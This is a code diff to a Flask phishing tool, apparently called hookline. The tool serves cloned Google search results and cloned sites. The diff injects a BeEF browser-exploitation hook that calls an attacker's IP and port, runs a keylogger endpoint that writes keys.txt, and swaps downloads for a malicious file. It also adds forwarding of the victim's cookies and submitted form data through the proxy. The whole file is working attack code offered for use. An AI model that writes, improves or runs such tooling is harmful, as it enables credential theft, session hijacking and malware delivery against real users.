@@ -1,12 +1,13 @@
 #-*-coding: utf-8-*-
 #imports
-from flask import Flask, request, render_template, send_file
+from flask import Flask, request, render_template, send_file, make_response
 from flask_cors import CORS
-import requests
+import requests  
 from shutil import copyfile
 from codecs import open as copen
 from platform import platform
 from os import path
+from bs4 import BeautifulSoup
 #clone.py comes with hookline
 import gclone
 
@@ -59,12 +60,12 @@ if opt == 1:
 
 #inject BeEF hook
 if opt == 2:
-	bip=input("BeEF ip: ")
-	bport=input("BeEF port: ")
+	beef_ip=input("BeEF ip: ")
+	beef_port=input("BeEF port: ")
 	bhooktmp = open("bhook.js","r")
 	bhooktmpr = bhooktmp.read()
 	bhooktmp.close()
-	bhooktmpr = bhooktmpr.replace("~bip~",bip).replace("~bport~",bport)
+	bhooktmpr = bhooktmpr.replace("~bip~",beef_ip).replace("~bport~",beef_port)
 	if IS_WINDOWS:
 		bhook = open("static\\js\\bhook.js", "w")
 	else:
@@ -111,23 +112,23 @@ def u():
 #serve google seach 
 @app.route("/search")
 def search(maldown=maldown):
-	a = request.args.get("q")
+	search_query = request.args.get("q")
 
 	if IS_WINDOWS:
-		template = path.isfile(f"templates\\{a}.html")
+		template = path.isfile(f"templates\\{search_query}.html")
 	else:
-		template = path.isfile(f"templates/{a}.html")
+		template = path.isfile(f"templates/{search_query}.html")
 
 	#clone google search
-	gclone.clone(a, template)
+	gclone.clone(search_query, template)
 	#Search2.html is served after being updated by clone
 	f = open("activesearch.txt","w")
-	f.write(a)
+	f.write(search_query)
 	f.close()
 	if opt == 4:
-		if "/" not in a and "\\" not in a:
-			copyfile(maldown,a+"."+maldown.split(".")[1])
-			maldown = a+"."+maldown.split(".")[1]
+		if "/" not in search_query and "\\" not in search_query:
+			copyfile(maldown,search_query+"."+maldown.split(".")[1])
+			maldown = search_query+"."+maldown.split(".")[1]
 	return send_file("templates/Search2.html")
 
 #serves premade pages
@@ -137,8 +138,10 @@ def tempfunc():
 	return render_template(tempf+".html")
 
 #generates fake versions on link click
-@app.route("/link")
+@app.route("/link", methods=['GET', 'POST'])
 def link():
+	a = make_response("a")
+	print(a)
 	url = request.args.get("url")
 	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
 		url="https://en.wikipedia.org/wiki/Idiot"
@@ -146,9 +149,21 @@ def link():
 
 	#Add add the user headers to the http request.
 	headers = {
-		"User-Agent": request.headers.get("User-Agent")
+		"User-Agent": request.headers.get("User-Agent"),
+		"Cookie": request.headers.get("Cookie")
 	}
-	r = requests.get(url, allow_redirects=False, headers=headers)
+
+	if request.method == 'GET':
+		r = requests.get(url, allow_redirects=False, headers=headers)
+
+	elif request.method == 'POST':
+
+		if not "original_url" in request.form:
+			return redirect()
+		data = request.form
+		r = requests.post(url, headers=headers, data=data)
+	else:
+		return "Method not allowed"
 
 	#keylogger
 	if opt == 1:
@@ -192,18 +207,23 @@ def link():
 		keyfile.write(url+"\n")
 	keyfile.close()
 
+	#Make response with cookies and modified document.
+	response = make_response(jsadd)
+	for cookie in r.cookies:
+		response.set_cookie(cookie.name, cookie.value)
+
 
 	#serve the cloned page
-	return jsadd
+	return response
+
 
 #keylogger
 @app.route("/key")
 def key():
 	keyget = request.args.get("key")
 	keyget = keyget.replace(" Key","")
-	with open("keys.txt","a") as keyfile:
+	with copen("keys.txt","a", encoding='utf-8') as keyfile:
 		keyfile.write(keyget)
-	keyfile.close()
 	return "return"
 
 #google search start
